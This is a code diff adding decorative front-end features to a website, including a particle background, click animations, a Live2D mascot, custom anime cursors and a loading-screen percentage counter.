+    color: #ffffff !important;
+  }
+  .hide-button {
+    background: rgba(0, 212, 255, 0.2) !important;
+    border-color: rgba(0, 212, 255, 0.4) !important;
+    box-shadow: 0 3px 15px 2px rgba(0, 212, 255, 0.4) !important;
+    color: #ffffff !important;
+  }
+  .hide-button:hover {
+    background: rgba(0, 212, 255, 0.3) !important;
+    border-color: #00d4ff !important;
+  }
+  .show-button {
+    background: rgba(0, 212, 255, 0.8) !important;
+    border-color: rgba(0, 212, 255, 0.6) !important;
+    box-shadow: 0 3px 15px 2px rgba(0, 212, 255, 0.4) !important;
+  }
+}
+</style>
+
+<!-- 粒子背景 -->
+<div id="particles-js" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;"></div>
+
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<script>
+  particlesJS("particles-js", {
+    "particles": {
+      "number": { "value": 100 },
+      "color": { "value": "#00ffff" },
+      "shape": { "type": "circle" },
+      "opacity": { "value": 0.6, "random": true },
+      "size": { "value": 3, "random": true },
+      "line_linked": { "enable": false },
+      "move": { "enable": true, "speed": 2, "direction": "none", "random": true }
+    },
+    "interactivity": {
+      "detect_on": "canvas",
+      "events": {
+        "onhover": { "enable": false },
+        "onclick": { "enable": false }
+      }
+    }
+  });
+</script>
+
+<!-- 鼠标点击特效 -->
+<style>
+.click-particle {
+  position: fixed;
+  border-radius: 50%;
+  pointer-events: none;
+  z-index: 9999;
+  animation: particleExplode 0.6s ease-out forwards;
+}
+
+.click-ripple {
+  position: fixed;
+  border: 3px solid #ff69b4;
+  border-radius: 50%;
+  pointer-events: none;
+  z-index: 9998;
+  animation: rippleExpand 0.8s ease-out forwards;
+}
+
+@keyframes particleExplode {
+  0% {
+    opacity: 1;
+    transform: translate(0, 0);
+  }
+  100% {
+    opacity: 0;
+    transform: translate(var(--tx), var(--ty));
+  }
+}
+
+@keyframes rippleExpand {
+  0% {
+    opacity: 1;
+    transform: scale(0);
+  }
+  100% {
+    opacity: 0;
+    transform: scale(3);
+  }
+}
+</style>
+
+<script>
+(function() {
+  var colors = ['#00ffff', '#ff00ff', '#ffff00', '#00ff00', '#ff6600', '#0066ff', '#ff3366'];
+  
+  document.addEventListener('click', function(e) {
+    var centerX = e.clientX;
+    var centerY = e.clientY;
+    
+    var count = 6;
+    for (var i = 0; i < count; i++) {
+      var angle = (Math.PI * 2 / count) * i + Math.random() * 0.5;
+      var distance = 80 + Math.random() * 60;
+      var size = 10 + Math.random() * 16;
+      var particle = document.createElement('div');
+      particle.className = 'click-particle';
+      
+      particle.style.width = size + 'px';
+      particle.style.height = size + 'px';
+      particle.style.left = centerX - size/2 + 'px';
+      particle.style.top = centerY - size/2 + 'px';
+      particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+      particle.style.boxShadow = '0 0 ' + (size/2 + 8) + 'px ' + particle.style.backgroundColor + ', 0 0 ' + (size + 15) + 'px ' + particle.style.backgroundColor;
+      
+      var tx = Math.cos(angle) * distance;
+      var ty = Math.sin(angle) * distance;
+      particle.style.setProperty('--tx', tx + 'px');
+      particle.style.setProperty('--ty', ty + 'px');
+      
+      document.body.appendChild(particle);
+      
+      setTimeout(function(p) {
+        p.remove();
+      }, 600, particle);
+    }
+    
+    var ripple = document.createElement('div');
+    ripple.className = 'click-ripple';
+    ripple.style.width = '40px';
+    ripple.style.height = '40px';
+    ripple.style.left = centerX - 20 + 'px';
+    ripple.style.top = centerY - 20 + 'px';
+    document.body.appendChild(ripple);
+    
+    setTimeout(function(r) {
+      r.remove();
+    }, 800, ripple);
+  });
+})();
+</script>
+
+<!-- 加载 Font Awesome 图标库 -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+
+<!-- Live2D 看板娘 - 本地资源 -->
+<link rel="stylesheet" href="/live2d/css/waifu.css">
+<div class="waifu" id="landlord">
+    <div class="waifu-tips"></div>
+    <canvas id="live2d" width="300" height="300"></canvas>
+    <div class="hide-button">隐藏</div>
+</div>
+<div class="show-button" id="showWaifuBtn" style="display: none;">🌸</div>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<script src="/live2d/js/live2d.js"></script>
+<script src="/live2d/js/waifu.js"></script>
+<script>
+  loadlive2d("live2d", "/live2d/model/pio/model.json");
+  console.log("Pio 酱模型已从本地加载");
+</script>
+
+<style>
+.animecursor-disabled,
+.animecursor-disabled * {
+  cursor: auto !important;
+}
+
+input, textarea, [contenteditable] {
+  cursor: text !important;
+}
+</style>
+
+<script src="/js/anime-cursor/dist/anime-cursor.umd.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    try {
+        new AnimeCursor({
+            fallbackCursor: 'auto',
+            excludeSelectors: 'input, textarea, [contenteditable]',
+            cursors: {
+                default: {
+                    image: '/img/mouse/default_001.png',
+                    default: true,
+                    offset: [0, 0]
+                },
+                pointer: {
+                    tags: ['a', 'button'],
+                    image: '/img/mouse/default_001.png',
+                    offset: [0, 0]
+                },
+                landlord: {
+                    tags: ['.waifu', '#landlord', '#live2d'],
+                    image: '/img/mouse/landlord_001.png',
+                    offset: [0, 0]
+                }
+            }
+        });
+        console.log('AnimeCursor initialized successfully');
+    } catch (error) {
+        console.error('AnimeCursor initialization failed:', error);
+        document.body.classList.add('animecursor-disabled');
+    }
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(function() {
+        var loader = document.getElementById('loader-wrapper');
+        if (loader) {
+            loader.classList.add('loaded');
+            
+            setTimeout(function() {
+                var mainContent = document.getElementById('main-content');
+                if (mainContent) {
+                    mainContent.classList.add('content-fade-in');
+                }
+                
+                setTimeout(function() {
+                    loader.remove();
+                }, 1000);
+            }, 300);
+        }
+    }, 800);
+});
+
+var loadPercent = 0;
+var percentInterval = setInterval(function() {
+    loadPercent += Math.random() * 15;
+    if (loadPercent > 95) loadPercent = 95;
+    document.getElementById('loader-percent').textContent = Math.round(loadPercent) + '%';
+}, 200);
+
+document.addEventListener('DOMContentLoaded', function() {
+    clearInterval(percentInterval);
+    document.getElementById('loader-percent').textContent = '100%';
+});
+</script>
